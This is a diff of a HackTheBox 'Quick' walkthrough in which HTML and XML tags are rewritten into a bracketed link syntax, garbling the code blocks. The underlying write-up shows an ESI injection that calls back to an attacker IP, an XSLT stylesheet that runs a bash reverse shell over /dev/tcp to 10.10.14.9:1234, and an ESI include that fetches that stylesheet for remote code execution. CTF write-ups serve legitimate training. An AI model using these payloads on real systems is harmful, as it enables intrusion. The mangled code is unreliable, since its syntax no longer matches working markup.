@@ -104,11 +104,11 @@ And Its working perfectly. Let's dig in.
 ```bash
 root@kali:/opt/quiche/target/debug/examples# ./http3-client https://quick.htb
 
-<html>
-<title> Quick | Customer Portal</title>
-<h1>Quick | Portal</h1>
-<head>
-<style>
+[html](html)
+[title](title) Quick | Customer Portal[/title](/title)
+[h1](h1)Quick | Portal[/h1](/h1)
+[head](head)
+[style](style)
 ul {
   list-style-type: none;
   margin: 0;
@@ -129,17 +129,17 @@ li a:hover {
   background-color: #555;
   color: white;
 }
-</style>
-</head>
-<body>
-<p> Welcome to Quick User Portal</p>
-<ul>
-  <li><a href="index.php">Home</a></li>
-  <li><a href="index.php?view=contact">Contact</a></li>
-  <li><a href="index.php?view=about">About</a></li>
-  <li><a href="index.php?view=docs">References</a></li>
-</ul>
-</html>
+[/style](/style)
+[/head](/head)
+[body](body)
+[p](p) Welcome to Quick User Portal[/p](/p)
+[ul](ul)
+  [li](li)[a href="index.php"](a href="index.php")Home[/a](/a)[/li](/li)
+  [li](li)[a href="index.php?view=contact"](a href="index.php?view=contact")Contact[/a](/a)[/li](/li)
+  [li](li)[a href="index.php?view=about"](a href="index.php?view=about")About[/a](/a)[/li](/li)
+  [li](li)[a href="index.php?view=docs"](a href="index.php?view=docs")References[/a](/a)[/li](/li)
+[/ul](/ul)
+[/html](/html)
 ```
 
 If you check the source code here, it shows some webpages, So I started checking them all.
@@ -148,18 +148,18 @@ And Here I found 2 pdf file. So I downloaded them to my machine.
 
 ```bash
 root@kali:/opt/quiche/target/debug/examples# ./http3-client https://quick.htb/index.php?view=docs
-<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
+[!DOCTYPE html](!DOCTYPE html)
+[html](html)
+[head](head)
+[meta name="viewport" content="width=device-width, initial-scale=1"](meta name="viewport" content="width=device-width, initial-scale=1")
 
-<h1>Quick | References</h1>
-<ul>
-  <li><a href="docs/QuickStart.pdf">Quick-Start Guide</a></li>
-  <li><a href="docs/Connectivity.pdf">Connectivity Guide</a></li>
-</ul>
-</head>
-</html>
+[h1](h1)Quick | References[/h1](/h1)
+[ul](ul)
+  [li](li)[a href="docs/QuickStart.pdf"](a href="docs/QuickStart.pdf")Quick-Start Guide[/a](/a)[/li](/li)
+  [li](li)[a href="docs/Connectivity.pdf"](a href="docs/Connectivity.pdf")Connectivity Guide[/a](/a)[/li](/li)
+[/ul](/ul)
+[/head](/head)
+[/html](/html)
 root@kali:/opt/quiche/target/debug/examples# ./http3-client https://quick.htb/docs/QuickStart.pdf > QuickStart.pdf
 root@kali:/opt/quiche/target/debug/examples# ./http3-client https://quick.htb/docs/Connectivity.pdf > Connectivity.pdf
 ```
@@ -250,7 +250,7 @@ So according to the article ESI `includes` are tags which, when processed by the
 For that I tried injecting the payload in `tickets.php` first. I tried in `title` parameter and `msg` parameter and finally I get the response on my python server when injecting in `id`
 
 ```nix
-<esi:include src="http://10.10.14.9:8000/hacker" />
+[esi:include src="http://10.10.14.9:8000/hacker" /](esi:include src="http://10.10.14.9:8000/hacker" /)
 ```
 
 ![https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-quick/Untitled%2011.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-quick/Untitled%2011.png)
@@ -268,27 +268,27 @@ Here In `cmd` I changed to Java Reverse shell. I tried number of payloads and ev
 That's why I decided to try this.
 
 ```xml
-<?xml version="1.0" ?>
-<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
-<xsl:output method="xml" omit-xml-declaration="yes"/>
+[?xml version="1.0" ?](?xml version="1.0" ?)
+[xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"](xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform")
+[xsl:output method="xml" omit-xml-declaration="yes"/](xsl:output method="xml" omit-xml-declaration="yes"/)
 <xsl:template match="/"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
-<root>
-<xsl:variable name="cmd"><![CDATA[bash -c bash${IFS}-i${IFS}>&/dev/tcp/10.10.14.9/1234<&1]]></xsl:variable>
-<xsl:variable name="rtObj" select="rt:getRuntime()"/>
-<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
-Process: <xsl:value-of select="$process"/>
-Command: <xsl:value-of select="$cmd"/>
-</root>
-</xsl:template>
-</xsl:stylesheet>
+[root](root)
+[xsl:variable name="cmd"](xsl:variable name="cmd")[![CDATA[bash -c bash${IFS}-i${IFS}](![CDATA[bash -c bash${IFS}-i${IFS})&/dev/tcp/10.10.14.9/1234[&1]]](&1]])[/xsl:variable](/xsl:variable)
+[xsl:variable name="rtObj" select="rt:getRuntime()"/](xsl:variable name="rtObj" select="rt:getRuntime()"/)
+[xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/](xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/)
+Process: [xsl:value-of select="$process"/](xsl:value-of select="$process"/)
+Command: [xsl:value-of select="$cmd"/](xsl:value-of select="$cmd"/)
+[/root](/root)
+[/xsl:template](/xsl:template)
+[/xsl:stylesheet](/xsl:stylesheet)
 ```
 
 This is the payload for `ticket.php`
 
 ```xml
-<esi:include+src="http://127.0.0.1/index.php"+stylesheet="http://10.10.14.9:8000/shell88.xsl">+</esi:include>
+[esi:include+src="http://127.0.0.1/index.php"+stylesheet="http://10.10.14.9:8000/shell88.xsl"](esi:include+src="http://127.0.0.1/index.php"+stylesheet="http://10.10.14.9:8000/shell88.xsl")+[/esi:include](/esi:include)
 ```
 
 So I created a ticket with `include` tag and that download the `.xsl` file and do the remote code execution.
@@ -398,7 +398,7 @@ if(isset($_POST["email"]) && isset($_POST["password"]))
         }
         else
         {
-                echo '<script>alert("Invalid Credentials");window.location.href="/index.php";</script>';
+                echo '[script](script)alert("Invalid Credentials");window.location.href="/index.php";[/script](/script)';
         }
 ```
 
@@ -429,7 +429,7 @@ if(isset($_POST["email"]) && isset($_POST["password"]))
 	}
 	else
 	{
-		echo '<script>alert("Invalid Credentials");window.location.href="/login.php";</script>';
+		echo '[script](script)alert("Invalid Credentials");window.location.href="/login.php";[/script](/script)';
 	}
 }
 ```
@@ -465,19 +465,19 @@ I looked at `apache2` config files we get to know a subdomain.
 
 ```
 sam@quick:/etc/apache2/sites-available$ cat 000-default.conf 
-<VirtualHost *:80>
+[VirtualHost *:80](VirtualHost *:80)
 	ServerAdmin webmaster@localhost
 	DocumentRoot /var/www/html
 
 	ErrorLog ${APACHE_LOG_DIR}/error.log
 	CustomLog ${APACHE_LOG_DIR}/access.log combined
 
-</VirtualHost>
-<VirtualHost *:80>
+[/VirtualHost](/VirtualHost)
+[VirtualHost *:80](VirtualHost *:80)
 	AssignUserId srvadm srvadm
 	ServerName printerv2.quick.htb
 	DocumentRoot /var/www/printer
-</VirtualHost>
+[/VirtualHost](/VirtualHost)
 # vim: syntax=apache ts=4 sw=4 sts=4 sr noet
 
 ```
@@ -559,13 +559,13 @@ if($_SESSION["loggedin"])
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
-    if (empty($_POST["title"])) { $error .= '<p><strong>Title</strong> is required</p>'; }
-    if (empty($_POST["type"])) { $error .= '<p><strong>Type</strong> is required</p>'; }
-    if (empty($_POST["profile"])) { $error .= '<p><strong>Profile</strong> is required</p>'; }
+    if (empty($_POST["title"])) { $error .= '[p](p)[strong](strong)Title[/strong](/strong) is required[/p](/p)'; }
+    if (empty($_POST["type"])) { $error .= '[p](p)[strong](strong)Type[/strong](/strong) is required[/p](/p)'; }
+    if (empty($_POST["profile"])) { $error .= '[p](p)[strong](strong)Profile[/strong](/strong) is required[/p](/p)'; }
 
     if ($_POST["type"] == 'network') {
-        if (empty($_POST["ip_address"])) { $error .= '<p><strong>IP Address</strong> is required</p>'; }
-        if (empty($_POST["port"])) { $error .= '<p><strong>Port</strong> is required</p>'; }
+        if (empty($_POST["ip_address"])) { $error .= '[p](p)[strong](strong)IP Address[/strong](/strong) is required[/p](/p)'; }
+        if (empty($_POST["port"])) { $error .= '[p](p)[strong](strong)Port[/strong](/strong) is required[/p](/p)'; }
     }
 
     if(!$error){
@@ -626,7 +626,7 @@ if($_SESSION["loggedin"])
 				$fp = fsockopen($ip,$port,$errno, $errstr, 20);
 				if(is_resource($fp))
 				{
-					$message='Printer is up. Please add a <a href="job.php?title='.$title.'">job</a>';
+					$message='Printer is up. Please add a [a href="job.php?title='.$title.'"](a href="job.php?title='.$title.'")job[/a](/a)';
 				}
 				else
 				{
@@ -736,7 +736,7 @@ srvadm@quick:~/.cache/conf.d$ cat printers.conf
 # Written by cupsd on 2020-02-18 17:11
 # DO NOT EDIT THIS FILE WHEN CUPSD IS RUNNING
 NextPrinterId 5
-<Printer Aviatar>
+[Printer Aviatar](Printer Aviatar)
 .
 .
 .
